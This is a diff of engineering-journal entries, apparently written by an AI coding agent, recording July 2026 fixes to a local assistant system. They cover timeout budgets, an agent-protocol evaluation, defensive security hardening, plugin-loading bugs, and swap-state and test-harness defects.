+oracle actually executing — failing, honestly, on the module a skipped task
+never built. Nothing in that verdict is a harness defect anymore; all of it
+is capability signal. The night-2 class is dead.
+
+But the day insisted on symmetry. B6 stalled at exactly 180 seconds with
+"No response from the Assistant Orchestrator" — the same message that killed
+attempt 1 — and the second instance met the evidence bar I had set at noon.
+The trail exonerated every prior suspect: certs were consistent, the
+re-ensure's mTLS probe was green, and attempt-1's AO log showed it SERVING
+the decompose a minute after boot. The killer was arithmetic, not health:
+a dispatch PLAN is six chained 14B generations, the gateway's single
+per-message receive budget is 180 s, and a freshly swap-back-booted AO —
+cold pipeline, empty prefix cache, first-generation warm-up — legitimately
+needs longer. The gateway hung up on an AO that was mid-sentence, and the
+runner filed it as a harness stall. The same lesson-214 shape as the
+morning, one layer up: the timeout's failure text pointed at the wrong
+party.
+
+The fix is deliberately surgical: a `PLAN_RESPONSE_TIMEOUT_S = 480.0` used
+by exactly one call site, with the transport openers taking a per-call
+budget and every other message keeping the 180 s the chat UX was tuned for.
+The rejected alternative — raising the global budget — would have made every
+genuinely-hung prompt turn three times slower to fail for the sake of one
+message type. A dead AO still fails fast: the per-job re-ensure completes a
+real mTLS handshake before any PLAN is sent, so the long budget only ever
+waits on an AO that is provably alive and working. Tonight's 23:00 run,
+whose cold transitions are exactly the failing case, is the live proof.
+
+The day's third diagnosis stayed deliberately unfixed. The operator flagged
+the visible console that appears at every swap-back as a future
+accidental-close accident, and the puzzle resolved elegantly: the relaunch
+DOES use DETACHED_PROCESS, but `.venv\Scripts\python.exe` is a launcher shim
+that spawns the real interpreter as a child — and that console-subsystem
+child, born to a console-less parent, is given a fresh visible console by
+Windows. The obvious cure is booby-trapped: a HIDDEN console is the exact
+shape that crashed Textual the night before ("Driver must be in application
+mode"), so the correct fix (a `pythonw` spawn chain plus a same-class sweep
+of every detached spawn site) needs a live swap-cycle verify — and four
+hours before the campaign run was the wrong time to gamble on the
+swap-critical path. I took the deferral with the trade-off named: one more
+night of a closable window, against the risk of a relaunch that cannot come
+back. (#761 carries the full mechanism and the sweep list.)
+
+**Next:** tonight's 23:00 run — first with the #766 budget, the #764 plugins
+active, and the raised 4-pass target; the #761 pythonw fix + spawn-site
+sweep tomorrow with a live swap verify; #760's decomposition-grain decision
+when the LA picks a disposition.
+
+*(commits `d10db41` (#766 fix + lock, merged `eb63691`); the pass evidence in
+`night-20260707-160408`; #757 closed live-proven; #764 deployed +
+bootstrap-verified; campaign target 3→4 hand-edited post-pass under explicit
+LA direction.)*
+
+### 2026-07-07 — Two protocols share an acronym; one of them points at a graveyard
+
+*Plain summary: authored and LA-approved the agent-protocol evaluation (`docs/research/agent-protocol-evaluation-2026-07.md`): Zed's Agent Client Protocol approved for a bounded driver-seam spike (Vikunja #759, builder brief merged to agentic-setup main `7f16cc3`); A2A watchlisted with two named revisit triggers; IBM's Agent Communication Protocol found defunct and categorically rejected; every runtime seam deliberately kept bespoke. No code or posture changed.*
+
+The Lead Architect asked a question that sounds simple and is a trap: two protocols both go by "ACP" — the Agent Client Protocol and the Agent Communication Protocol — would either mature this system? The trap is the acronym. Four parallel research agents later (two on the open web against primary sources, two grounding every communication seam in this repo and agentic-setup with file:line evidence), the answer split cleanly — and the most important finding was about the protocol we will *not* use. IBM's Agent Communication Protocol, the agent-to-agent one, stopped existing as an independent standard on 2025-08-29: merged into Google-origin A2A under the Linux Foundation, repos archived two days earlier, SDK deprecated, five months old at death. Had we adopted by acronym recognition rather than checked liveness first, we would have built on an archived spec. That is the lesson-shaped part of this entry.
+
+The rest was fit analysis, and the architecture answered most of it before taste could. A2A — the surviving successor, now at v1.0 with real cloud-vendor adoption — is federation machinery: discovery cards at well-known URIs, OAuth, webhooks, opaque peers across organizations. We have exactly one trust domain, and our one genuinely agent-shaped hand-off (the assistant dispatching a coding job to the fleet) is file-mediated *because the client process dies on purpose mid-job* — the 14B steps aside so the 30B can have the GPU. A session protocol cannot span a participant that is deliberately not running; the write-ahead swap-state file and this week's #758 driver-alive reconcile are the honest engineering answer to that constraint, and our scorecard verdicts (GREEN / PARKED-HONEST / STALLED / FALSE-DONE / RECOVERED, with attribution) already say more than A2A's eight task states can. I recommended watchlist-only with two concrete revisit triggers — the fleet ever leaving this box, or BlarAI ever consuming an external networked agent post-air-gap — and the LA endorsed it in plain terms: no real use case today. The runtime seams (named pipe, mTLS loopback, AF_HYPERV vsock) stay bespoke as security controls; each rejection is recorded with its reason in the evaluation doc §6.3, because the paths not taken are the part of a governance record that evaporates first.
+
+The Agent Client Protocol is the opposite story, and the evidence arrived with unusual force: opencode — the exact coding agent our fleet drives headless — already ships a native `opencode acp` server mode, and our installed 1.17.8 has it. Today we drive opencode by spawning it once per turn and inferring its progress by regexing a transcript logfile and polling file mtimes plus CPU deltas — machinery that exists only because there is no structured event channel, and that the stall-detection lessons ("dev-cycle speed is THE constraint") were paid for in wall-clock. ACP replaces exactly that layer with typed protocol primitives: per-tool-call events with status transitions, plan updates, honest StopReasons of the kind #757 just hand-built, cooperative cancel before tree-kill. The LA approved a bounded, side-by-side spike (#759) — one real candidate build through an ACP session, A/B'd against the regex path on event fidelity, stall latency, Windows stdio robustness, and overhead — with integration, if the spike goes green, escalating back as a separate decision. I went with a spike rather than direct adoption because the load-bearing unknown is parity: whether `opencode acp` on headless Windows loads the same config and plugins (including the F1 path-normalize fix) as the `run` path — accepting a slower arrival at the benefit in exchange for not betting the fleet's one working driver on an unverified mode.
+
+One more thing changed between proposal and approval, and it is worth keeping: the proposal sequenced the spike "after the F1/F3 coder-reliability fixes," inherited from the 2026-06-30 bottleneck brief. A post-approval check of the actual tree found both already shipped — F1's `path-normalize.js` landed on agentic-setup main the same day the brief naming it was written, F3's `Add-WebHint` likewise — so the sequencing condition was met before the ink dried. The prudent-later became actionable-now only because the tree was checked instead of the narrative trusted; a week-old brief is already a historical document in this project.
+
+**Next:** run #759 in a free machine window (recon first — config/plugin parity needs no GPU; then one live candidate build with the 30B). If GO, scope the driver integration as a follow-up LA decision; if NO-GO, the finding goes upstream to opencode and the regex path keeps its job with a clear conscience.
+
+*(commits: agentic-setup `7f16cc3` (builder brief, merged `327dcfa`); blarai `88e8d2f` (evaluation doc APPROVED + this fragment); Vikunja #759 carries the full decision record including the A2A watchlist.)*
+
+
+### 2026-07-07 — Closing the residuals the door I never opened was hiding
+
+*Plain summary: executed "bucket A" of the 2026-07-07 gate-residual disposition sweep — four verified security fixes with regression locks, merged to main `4d9ddf7`. #571 (PA per-request weight re-verify now signature-checked), #633 (two tokenizer loads pinned offline), #641 (guest configs ship dev_mode=false), #636 (trust-root roadmap reconciled). Standing gate 5742/0 on main. No production egress/posture change.*
+
+The disposition sweep earlier tonight had sorted the June air-gap-campaign residuals into buckets; the LA approved the free-fixes bucket and cleared a machine window once the supervised battery proof finished. What made this worth a journal entry is not the four fixes individually — each is small — but the discipline the sweep-then-fix loop enforced, and one real bug the verification caught that the disposition had under-weighted.
+
+The load-bearing fix is #571. The Policy Agent verifies the 14B weight manifest's TPM signature *at boot* (`require_signed_manifest=true` since Sprint 18), but its Stage-2 *per-request* re-verification — the event-triggered re-hash that guards against runtime weight corruption — loaded the manifest through the unsigned `load_manifest`, comparing a possibly-tampered weight against a possibly-tampered `manifest.json`. An attacker who could rewrite both files at runtime defeated it until the next cold boot. The fix threads a `require_signed` flag from the config, through the adjudicator, into the re-verify so it routes through the signature-checked loader in production. The trade-off I took and want on the record: I gave `verify_weight_integrity` a `require_signed=False` default so every existing caller — the boot sweep, the Group-C tests — stays byte-identical, and only the adjudicator's production path opts in. The rejected alternative was flipping the default to always-verify, which is cleaner-looking but would have added a TPM signature check (and a warning-log on every unsigned test manifest) to a dozen call sites I hadn't audited. Default-off-opt-in-at-the-one-site-that-matters is the smaller blast radius. Critically, I wired it at the `_build_adjudicator` construction site where `resolved.require_signed_manifest` was already in scope — because the failure I'd journaled only hours earlier (the opencode plugins that loaded into nothing) was exactly a control built but never threaded to its call site. Adding a parameter with a default and *not* wiring it would have been that same lesson, wearing a security badge.
+
+The verification caught the one genuine bug. My #633 change — adding `local_files_only=True, trust_remote_code=False` to two bare tokenizer loads — broke two fail-soft fallback tests, because their test double mocked `AutoTokenizer.from_pretrained` with a lambda that accepted a single positional argument and my hardened call now passed keyword arguments the mock couldn't absorb. This is the honest shape of the thing: the production change was correct, the *test double* had encoded the old call signature, and the fix was to make the double tolerate the real call (`**_kwargs`), not to weaken the assertion. It's a reminder that a green suite before a change doesn't mean the change is wrong when it goes red — sometimes the mock was lying about the interface.
+
+The other two are smaller but not zero-judgment. #641 flips `dev_mode=true` to `false` in the two guest-profile configs. I confirmed first that this is a genuine no-op at runtime — `resolve_dev_mode(GUEST)` already forces `False` by construction, the guest profile is dormant (production runs host-mode), and the AO's config validator only checks that the file loads, not a dev_mode/cert coupling that could have turned the flip into a refuse-to-start. So the change buys nothing at runtime and everything in honesty: the shipped file now says what the system does, and a new regression lock in the very test file built to catch "insecure flag flipped back" asserts `dev_mode=false` on both guest configs so it can never silently regress. #636 reconciled two stale Sprint-16-start bullets in the security roadmap that still claimed the manifest-signing key was unprovisioned and `require_signed_manifest=false`, directly contradicting the same file's own refreshed key-state table — I annotated the historical snapshot as superseded rather than deleting it, and fixed the capstone evidence string the #641 flip had just made stale.
+
+Everything was verified before merge, not asserted: the full standing gate green on the worktree (5721/0, with the documented worktree-missing-model skips), then — because those very skips were the semantic-router tests that would exercise my router tokenizer line — I junctioned the gitignored bge model into the worktree and ran router+pgov to green (163/0) so no changed line rode to main uncovered, then the authoritative gate on the merged main checkout at 5742/0. The whole pass touched only dormant/defense-in-depth surfaces; no egress door moved, no posture flipped, and the guest profile stayed dormant throughout.
+
+**Next:** the sweep's remaining buckets are the LA's to schedule — the dependency hash-lockfile (#560-b1) and all-weights manifest coverage (#560-b2, the draft model runs alongside the 14B every turn and is unsigned) as conditions of the next egress ceremony; #615 guest-mTLS cert provisioning coupled to the UC-003 URL-ingest go-live; and #651 (the OS-level firewall floor, whose priority rose once web_search went live) plus #590 and the re-scoped #606 as scheduled hardening.
+
+*(commits: `60b9b65` bucket-A fixes, merged `4d9ddf7`; blarai main. Tickets: #571/#633/#636/#641 fixed + closed; disposition sweep comments on #560/#590/#606/#615/#651; #606 re-scoped to the active-tail residual. Gate 5742/0/122 on `4d9ddf7`, LOCALAPPDATA-redirected, live AO up.)*
+
+### 2026-07-07 — The issue that fixed itself (and why that required more proof, not less)
+
+*Plain summary: ISS-3 (Policy Agent over-denial — 4 of 30 benign actions wrongly DENIED, first measured 2026-07-02) CLOSED on N=3 evidence: all four false-DENY cases pass in three consecutive same-tree hardware runs at `1deed99` (35/35 each), with the standing eval gate as the permanent regression tripwire. Attribution recorded honestly: no deliberate fix ever landed — the flip is a side effect of intervening generation-substrate changes, most plausibly the #725 xgrammar/spec-decode ordering fix. Subsystem: PA classification / evals.*
+
+The uncomfortable part of closing ISS-3 was that nobody fixed it. The July 2nd measurement gave the over-denial three disposition options — prompt tuning, few-shot examples, or accept the bias — and the decision was never taken; five days of unrelated substrate work later, the four failing cases simply pass. An improvement you cannot attribute deserves more suspicion than one you can, so the closure bar went up, not down: one clean run says "maybe," so the evening ran the suite twice more back-to-back on the identical tree. Three consecutive 35/35s eliminate run variance, and the deterministic config plus the identical case IDs make the comparison honest. What makes the closure durable rather than hopeful is the control that outlives it: these exact cases ride the eval gate at every future hardware ceremony, so a recurrence is not a regret discovered in a quarterly review — it is a failing gate the same day. The trade-off named: closing on side-effect evidence means the CAUSE remains unproven, and if some future substrate change flips the cases back, the reopened issue will carry two tree-pinned data points instead of a shrug.
+
+**Next:** nothing scheduled — the gate owns the watch. If pa-mdl-001/002/006/008 ever fail a hardware ceremony, reopen ISS-3 citing this entry.
+
+*(commits `33f2ec2` (evidence run2/run3 + PERFORMANCE_LOG addendum + the CLAUDE.md closure record); #717 c.1447-1448.)*
+
+### 2026-07-07 — The verification line nobody ever read
+
+*Plain summary: the #759 ACP recon handshake caught both coder-fleet opencode plugins silently dead in production — `"Plugin export is not a function"` — since 2026-06-30: F1 (`path-normalize.js`) never loaded once; `command-timeout.js` died when the #687/#688 wave added a regex named export. Fix proven (functions-only exports, 18/18 reworked tests, side-by-side loader validation on opencode 1.17.8) and committed UNMERGED to agentic-setup `fix/opencode-plugin-loader-exports` (`2bba9f8`) respecting the live battery campaign's config freeze; deploy + campaign-timing decision tracked at #764. Live plugin dir and production fleet untouched by the recon session.*
+
+The Agent Client Protocol recon was supposed to answer a modest question — does `opencode acp` load the same config and plugins as the production `run` path? — and it answered a much bigger one. The very first handshake, run with `--print-logs` because parity was the point, printed two ERROR lines the production path never shows: both fleet plugins failing to load, `"Plugin export is not a function."` The production invocation doesn't pass `--print-logs`, so in every real run since the end of June this failure has printed exactly nothing.
+
+The verification against production logs is the part worth keeping. Both plugins ship a stderr load-line, and `command-timeout.js` even documents why: *"Load-log (stderr) so the fleet can VERIFY the plugin actually wired in."* The `.err` files the fleet already captures made the bracket exact — command-timeout's load-line appears through 2026-06-30 14:09 in its old, pre-server-probe format and never again; the new format appears in no production log ever; and `[path-normalize] loaded` appears nowhere in `state/` at all. F1 — the fix the bottleneck brief sequenced everything behind, the fix I verified as "shipped on main" hours earlier when upgrading the ACP spike to actionable — shipped, synced, and never executed once. The control that would have caught it existed from birth; nothing ever grepped for it. A verification line nobody reads is a verification line that does not exist.
+
+The mechanism was provable without touching anything shared: opencode's plugin loader treats every named export as a plugin factory and rejects the whole file when one is not a function. Both files' first named export was a regex, exported for the test files. The pre-#688 backup in `state/backups/` exports only functions — the exact breaking delta, preserved by the harness's own backup discipline. The fix is correspondingly small: regexes and helpers become module-private, each plugin exports only its factory, and the tests — rather than losing coverage — now drive the real `tool.execute.before` hook through the factory, which tests the seam that actually failed. Validation was the satisfying kind: with the fixed files as project-level plugins in a scratch project, one boot of opencode 1.17.8 shows the unfixed global copies erroring and the fixed copies printing both load-lines — the failure and the fix side by side in a single stderr.
+
+Two judgment calls shaped the night. First, the fix went to an unmerged branch instead of production: the battery campaign owns the machine, its session set an explicit freeze on the shared opencode config until the GPU-free window, and — less obviously — deploying mid-campaign changes coder behavior between passes, which is the campaign owner's trade-off to take, not mine. I went with fix-proven-and-parked over fix-landed, accepting that the next pass would run uncapped like every pass before it, because a baseline campaign's internal consistency is a measurement-design decision that belongs to its owner (#764 frames both options with the discontinuity named). Second, the recon itself produced a teardown lesson for the future ACP driver: my own hard tree-kill of the first handshake corrupted that scratch project's opencode state — the next boot exited 1 silently — which is precisely why the driver should prefer `session/cancel` and treat tree-kill as the last resort, not the routine.
+
+**Next:** #764 deploy in the coordinated window (two-file explicit copy — never the installer's `*.js` glob, which would activate the staged-unverified `qwen-sampling.js`; that trap is flagged on the ticket) with the load-line grep as the verify step; the campaign owner decides deploy-now-vs-after-campaign; the #759 live A/B runs only after the fix is live so both legs measure a plugin-active fleet.
+
+*(commits: agentic-setup `2bba9f8` on `fix/opencode-plugin-loader-exports` — deployed 18:30 + merged `929e5fa` the same evening under the campaign owner's c.1417/c.1419 era decision, so the plugin-ACTIVE era began with the 23:00 run; blarai `4d9e2cd` (the fragment). Tickets: #764 (defect + deploy), #759 c. recon-complete (full evidence), #762 c. (canary scope addition). Evidence: `state/reports/*.err` load-line bracket; recon stderr transcripts. Lesson 46's THIRD instance — its structural control, the #762 load-line canary, shipped with this fold: agentic-setup `b5a89e6`.)*
+
+### 2026-07-07 — The taxonomy of scars
+
+*Plain summary: the timeout registry shipped (`shared/timeout_registry.py` + 11 standing-gate locks) — one table of message/operation type → budget → the incident that justified it → the review trigger, with drift/discovery/quality teeth, a ten-row honest backlog, the quarterly review coupled to the LESSONS consolidation cadence (rule 5 amended), and the governance program (backlog promotion, code consolidation, shrink, retire) ticketed as #767. LA-directed same-evening, out of a bedtime question. Subsystem: cross-cutting config governance.*
+
+The day produced two timeout scars before dinner — the fleet's run budget killing its own acceptance task (#757) and the gateway hanging up on a cold assistant mid-plan (#766) — and when the LA asked what the "PLAN budget" was, the honest answer exposed the pattern: this system's timeouts are a taxonomy that nobody can see. Each number was paid for by a specific incident (the 120→180 vision-turn raise, today's pair), each lives where its consumer lives, each carries its story only in a docstring — and drift between siblings goes unnoticed, which stopped being hypothetical the moment the registry's own seeding inventory caught `monitor.py` still defaulting 5400 while the #757 sweep had moved its whole family to 10800 that very morning.
+
+The design choice worth recording: the registry is a TABLE WITH TEETH, not a config source. Moving the constants themselves into one module tonight would have touched every surface the 23:00 campaign runs on; instead the constants stay put and the standing gate cross-checks each registered row against its live value by import — a timeout changed without its row (or a row without its timeout) fails the gate. A discovery scan closes the other door: a timeout-shaped constant that is neither registered nor on the explicit backlog fails collection review, so a new budget cannot land invisibly. The backlog is deliberately public — ten known-but-unpromoted rows in the module itself, because a registry that silently covers 40% of reality while implying 100% is the C14 class wearing a new hat. The invasive consolidation, the shrink program (budgets down to measured worst cases), and the retire program (the best timeout is one replaced by an event) are #767's charter, and the quarterly LESSONS pass now walks the table by rule.
+
+**Next:** #767 — backlog promotion (incl. the monitor.py 5400 reconcile), the code-consolidation pass in a safe window, and the first shrink candidates once the campaign's latency data accumulates.
+
+*(commits `88103be` (registry + 11 locks + LESSONS rule-5 amendment + the CLAUDE.md doctrine row), merged `089dc45`; #767 (governance program); the registry's first catch recorded in its own BACKLOG. Lesson 217 minted at fold.)*
+
+### 2026-07-07 — The bridge built beside the door it must not open
+
+*Plain summary: #744 slice 2 — the AF_HYPERV transport for the guest-certified oracle corridor (`shared/fleet/guest_oracle_bridge.py` + `shared/fleet/guest_oracle_transport.py`), built-not-registered, 43 offline locks, production wiring unchanged at `transport=None`; built on branch `feat/744-guest-oracle-transport`, independently reviewed + merged `e7ed3b6` the following night.*
+
+Yesterday's slice shipped the guest-oracle executor with an honest hole in the middle: `run_guest_oracle` proves a snapshot shippable and then reports `not-run guest-transport-unregistered`, because nothing in the build could actually carry bytes to the NIC-less guest. Tonight's slice builds that carrier — and the whole discipline of the work was building it so that it still carries nothing.
+
+The transport itself is deliberately unoriginal. The #655 guest-parser bridge already solved every hard problem on this path — the 3.11 runtime that cannot address AF_HYPERV (the address family arrived in CPython 3.12), the 3.14 subprocess helper with its one-line-JSON-then-length-prefixed-frames pipe contract, the interpreter discovery order that refuses to ever fall back to the runtime interpreter, the plaintext-AF_HYPERV bring-up with dormant mTLS plumbing — and it is proven on the real vsock boundary since 2026-06-11. So I mirrored it structurally: `guest_oracle_bridge.py` is the parser bridge speaking ORACLE_EXEC frames, `guest_oracle_transport.py` is the invoker plus the `parse_round_trip` routing plus a factory that emits exactly the `(snapshot_zip, oracle_rel_path) -> dict` callable the pipeline's `transport` parameter accepts.
+
+The one trade-off worth remembering: I duplicated roughly 150 lines of proven bridge machinery (pipe framing, discovery, subprocess plumbing) instead of importing it, because the proven copy lives in `launcher/` and the caller here is `shared/fleet/` — and `shared` importing `launcher` would invert the layering that keeps the launcher heavy and the shared tier pure. The alternatives were worse: hoisting the parser bridge into `shared/ipc` would have churned a live, go-live-proven corridor to serve a dormant one, and teaching the PARSER bridge an oracle op would have coupled two capabilities whose go-live ceremonies are separate LA decisions. I took the duplication, accepting the maintenance cost, and pinned the contract with an import-discipline test so the copy cannot quietly grow launcher or network imports.
+
+Dormancy is the actual deliverable. The factory ships built-not-registered — the url_adjudicator precedent — and the locks make that a provable property rather than a promise: one test pins `transport=None` in the source of `swap_ops.real_run_guest_oracle`, one pins the pipeline's parameter default, and one scans every production module under `shared/`, `services/`, and `launcher/` asserting none references the factory or the bridge. The day that scan fails is the go-live ceremony, on purpose. Meanwhile the wire itself is proven as far as offline honesty allows: the full chain — real snapshot builder, real overlay and dep scan, channel encode, a fake vsock double, the real guest half running actual `python -m pytest`, channel decode, the pipeline's closed result shape — runs green with only the socket faked. Every failure path lands on an honest `not-run` with a stable machine reason (`oracle-request-unsendable` before any I/O, `guest-unreachable` after, correlation-mismatch refused), because the swap teardown must never inherit an exception or a fabricated verdict from this corridor.
+
+One deviation from a literal reading of the parser precedent: the factory raises loudly at construction when the version bridge is required and no 3.12+ interpreter qualifies. That is the invoker's own posture (resolve once, fail at wiring time), but it matters more here — the ceremony operator finds out at the terminal, not the swap teardown at 2 a.m. inside a fail-soft guard that would have silently swallowed it.
+
+**Next:** the LA's supervised go-live ceremony — provision pytest in the `BlarAI-Orchestrator` guest (parser-pattern provisioning record), stand up the guest-side oracle service on the vsock listener, register the factory at the `real_run_guest_oracle` call site (consciously amending the dormancy locks), flip `[fleet_dispatch].guest_oracle_enabled=true` for one dispatched job, and read the first live `guest-oracle.json`.
+
+*(commit `7d863bc` (transport + bridge + 43 locks on `feat/744-guest-oracle-transport`); worktree standing gate 5764/0/28 env skips/122 deselected; independently reviewed + merged `e7ed3b6` 2026-07-08 (overnight watch), merge gate 5804/0 exit 0; awaiting the live in-guest proof at the ceremony.)*
+
+### 2026-07-08 — The detector that aimed at production, and the stamp that never survived its first write
+
+*Plain summary: two gate-vs-live-fleet defects found and fixed during the overnight battery watch. (1) The root-conftest port-5001 leak detector false-positived a standing gate that spanned a battery job's teardown (free→held = the fleet restoring the AO, not a test leak), failed the run, and put the production AO's pid on its tree-kill list — fixed with a fleet-swap-state fingerprint (silent pass when a dispatch cycle ran during the session) and by restricting the self-heal kill to session-descendant PIDs (`2015c4d`). (2) The #758 driver-alive stamp was being clobbered back to 0/0.0 by `SwapDriver._phase`'s fresh-SwapState construction on the very first phase write, leaving the reconciler's live-vs-crashed gate inert for real AO boots mid-dispatch — found live in the real `current.json` (phase CODE, driver_pid 0), fixed by carrying the stamp on every phase write (`a947865`). Subsystem: test governance / fleet swap. Recurrences of lessons 216 and 46.*
+
+The first standing gate I ran on the merged #744 transport ended 5803 passed, 0 failed, 1 error — and the error was on a test that reads two static TOML files. It passed alone in a tenth of a second. The full run had taken nineteen minutes instead of two and a half, because the battery campaign owned the box, and that was the whole story: my gate started at 00:16, while B2's dispatch had the AO stopped and port 5001 free; B2's teardown restored the AO at 00:24; my session teardown at 00:35 found the port held, and the leak detector — built to catch tests that leak an AO process — concluded this session had leaked one. It failed the run on whatever test happened to finish last, and then it did the part that makes this entry worth writing: it looked up the PIDs holding the port and called `terminate_process_tree` on them. The list contained exactly one pid — the production AO the battery had just restored, the process the next battery job's preflight depends on. The kill happened to no-op (the AO was mid-PLAN for B3 and never noticed), but nothing in the design deserved that luck. A safety mechanism written for one topology — quiet box, gate alone — had become, under the new always-something-dispatching topology, a gun aimed at the thing it was protecting. This is #758's class exactly, one door over: yesterday it was the boot reconciler "recovering" a healthy swap; tonight it was the leak detector "cleaning up" a healthy AO.
+
+The fix keeps the detector's teeth and takes away its aim. The pure verdict function grows one input: did the real fleet root's swap-state advance during the session? A gate that brackets a dispatch cycle now attributes free→held to the fleet and passes silently; a gate on a quiet fleet still fails loud on a genuine leak. And the self-heal kill is now allowed to touch only PIDs whose live ancestor chain contains the pytest session itself — a leak *this session caused* is, by definition, a process this session spawned. An unattributed holder still fails the run loudly, but with the kill withheld and named in the message. I considered attributing external holders by parent-chain liveness alone and passing silently on those too, and rejected it: on Windows, broken parent chains are normal (explorer's own parent is dead by design), so genealogy can prove ours but cannot safely prove theirs. The residual — an operator hand-launching the app mid-gate still produces a loud false positive, without a kill — is visible, harmless to production, and accepted.
+
+The second defect fell out of reading the live `current.json` while attributing the first. Phase CODE, five tasks, plan hash — and `driver_pid: 0`. Yesterday's #758 fix has the driver entrypoint stamp its pid and create-time into the swap state at takeover so the reconciler can tell a live swap from a crashed one. The stamp was written, once — and `SwapDriver._phase` builds a fresh `SwapState` from its own fields on every transition, so the driver's first phase write clobbered the stamp back to zero milliseconds after it landed. Every part of #758 was proven in isolation — the probe, the round-trip, `with_phase` preservation, the reconciler's hands-off branch — and no test asked whether the running driver's actual writes still carried the pid ten seconds into a real run. The control shipped, was believed active, and had been dead in production since the first dispatch after its merge; the box it was built to protect ran all night with the gate it added reading "recover unconditionally." That is lesson 46's shape recurring inside the very arc that minted lesson 216: a green suite proves the mechanism, never that the running system still invokes it — and this time "invokes" meant "doesn't immediately overwrite." The fix carries the stamp on every `_phase` write (computed once at driver construction, psutil-less degrading to pid-only exactly like the entrypoint), and the new lock drives the real `SwapDriver._phase` twice and asserts `driver_alive` holds on both read-backs — the composition test the original change lacked.
+
+Trade-off named for the record: the fleet-fingerprint check reads the real fleet root's state file from inside the test harness — a deliberate, read-only exception to "tests never touch the real fleet root," accepted because the alternative (a detector blind to the fleet) is what produced tonight's aimed kill; the helper is stat+parse only, fail-soft to the old behavior when anything is unreadable.
+
+The live proof came the same night: the full standing gate re-run on merged main, with B3 actively dispatching through the whole window, came back **5804 passed / 0 failed / 0 errors, exit 0** — the exact concurrent-fleet condition that false-positived the first attempt, now attributed correctly.
+
+**Next:** the fold takes this entry with the rest of the inbox; the reconcile-side residual (`driver_pid=0` states written by tonight's still-unfixed in-flight driver) ages out at the first dispatch after the merge; the operator-launches-app-mid-gate false positive stays a known, visible residual.
+
+*(commits: `2015c4d` (detector fleet-awareness + kill attribution, 13 locks), `a947865` (driver stamp on every phase write + the composition lock), merges `ac5d709`/`f44710e`; live-proof gate 5804/0/122 exit 0 on `f44710e`. Found during the night-20260707-230002 watch; battery unharmed — B1/B2 scorecards honest, B3 mid-CODE throughout. Tickets: #740 c.1453, #758 (the parent class).)*
+
+### 2026-07-08 — The healthy run that could never end
+
+*Plain summary: the overnight watch's second incident — fixing the clobbered #758 driver-alive stamp exposed that the fleet's terminal-phase stamp had only ever come from a reconcile branch the clobber itself kept firing. B4 finished honestly at 05:34 and the battery monitor waited blind on a terminal phase nobody would ever write. Durable fix: a healthy driver stamps PHASE_RECOVERED as its own last act; a failed restore deliberately stays in-flight for the reconcile. Merged `f13742f` at 06:11, before B5's driver spawned. Subsystem: fleet swap / battery monitor. New lesson (218).*
+
+Four hours after I fixed the driver-alive stamp — the #758 control that `SwapDriver._phase` had been clobbering back to zero on every write — the fix produced its first live consequence, and it was not the one intended. B4 completed beautifully: all five tasks merged, every wave gate green, and the job oracle's GRADE leg fired live for the first time in the campaign, failing honestly on a real interface mismatch. The driver wrote its scorecard, restored the 14B, swept its worktrees, and exited at 05:36. And then nothing happened. The battery runner sat for twenty-five minutes with a finished run it refused to see, the swap state pinned at RESTART-AO, and its three-hour doom clock running.
+
+The mechanism took three reads to believe. The monitor completes only on a terminal swap phase — a deliberate #686 design, because SUMMARY.txt gets overwritten per task and only the phase says "every task processed and the 14B restored." But nothing in the *driver* has ever written that terminal phase. It always came from somewhere else: the restarted AO's boot reconcile, whose recover branch stamps RECOVERED — and whose recover branch only ever executed because the driver_pid it probed read zero. The clobber I fixed this morning had been silently keeping the whole completion protocol alive. With the pid finally carried correctly, the fresh AO booted mid-cleanup, correctly concluded the driver was alive, correctly went hands-off — and the system arrived at a state its designers never drew: driver done and gone, run genuinely finished, no party left holding the pen. A bug had been load-bearing, and I had knocked it out from under a protocol that never knew it was leaning on one.
+
+The night added a governance wrinkle worth keeping. The fastest unstick — stamping RECOVERED into the live swap state by hand, or bouncing the AO so its reconcile would stamp it — was blocked twice by the permission layer, whose classifier read both as mutations of shared runtime state beyond the night's charter. It was right to make me stop and think. The non-intervention path turned out to be verifiably safe: `adopt_driver_scorecard` keeps the driver's own verdict even when the monitor times out, so B4's honest PARKED-HONEST would survive the doom — the only cost was dead wait. I let the doom clock do the unsticking and spent the interval on the durable fix instead: the driver now stamps PHASE_RECOVERED as its own final act, but only on a successful 14B restore — a failed restore stays in-flight on purpose, because that is the reconcile's case (disarm, stop, tell the operator), and taking it away would have traded a liveness hole for an honesty one. Two locks pin both branches. The merge landed at 06:11, twenty-one minutes before the doom, which means B5, B6, and B7 all spawn drivers that can end their own runs.
+
+**Next:** watch B4 adopt at the doom (~06:32) with its verdict intact, then B5 prove the stamp live at its natural finish; the B3 exclusion edit and the #762 canary merge still wait for the pass-end window.
+
+*(commits `00ca615` (stamp + 2 locks), merge `f13742f`; the exposing fix was `a947865` this same night; incident record #740 c.1458. B4: PARKED-HONEST [BUILD], oracle GRADE leg live, `ModuleNotFoundError: No module named 'cli'` — the collection-error capability class.)*
+
+### 2026-07-07 — The flag that worked, one process too early
+
+*Plain summary: #761 — the swap-back's visible AO console traced to the Windows
+venv launcher shim defeating DETACHED_PROCESS one hop down; the detached
+launcher/driver spawn chain now rides the venv's pythonw.exe (GUI subsystem),
+and the driver's pwsh/git/tasklist children ride CREATE_NO_WINDOW; subsystem:
+shared/fleet swap path + battery harness; lesson class C15 (close the class,
+not the instance).*
+
+The operator sent a screenshot mid-battery: a console window titled
+"Administrator: ...\.venv\Scripts\python.exe" — the AO the swap driver had just
+relaunched — with the flag he raises better than any test suite: "I'll
+accidentally close the window." He would, too; the night-2 23:53 incident was
+exactly that class, and closing this one kills the assistant mid-campaign.
+
+The puzzle was that the code looked right. `restart_launcher`,
+`_spawn_detached_driver`, and the battery's `boot_launcher_detached` all spawn
+with `DETACHED_PROCESS` — the documented "allocate no console" flag — and yet a
+console existed. The diagnosis (recorded on #761 c.1424 before any code moved):
+`.venv\Scripts\python.exe` on Windows is not the interpreter. It is the venv
+LAUNCHER SHIM, and it spawns the base `Python311\python.exe` as a *child*. The
+shim itself honored DETACHED_PROCESS and got no console; its child is a
+console-subsystem executable born to a console-less parent, so Windows
+allocated it a fresh, visible one. The flag worked — one process too early.
+The control was verified at the spawn site, but the property it was supposed
+to pin (no closable window) lives at the end of a chain the platform quietly
+extends.
+
+The tempting fix was booby-trapped, and we knew because we had already stepped
+on it: `CREATE_NO_WINDOW` gives the child a *hidden* console, and a hidden
+console is precisely what crashed the launcher's Textual TUI on 2026-07-06
+("Driver must be in application mode") — a control that would have traded an
+accidental close for a guaranteed boot failure. The chosen path is the venv's
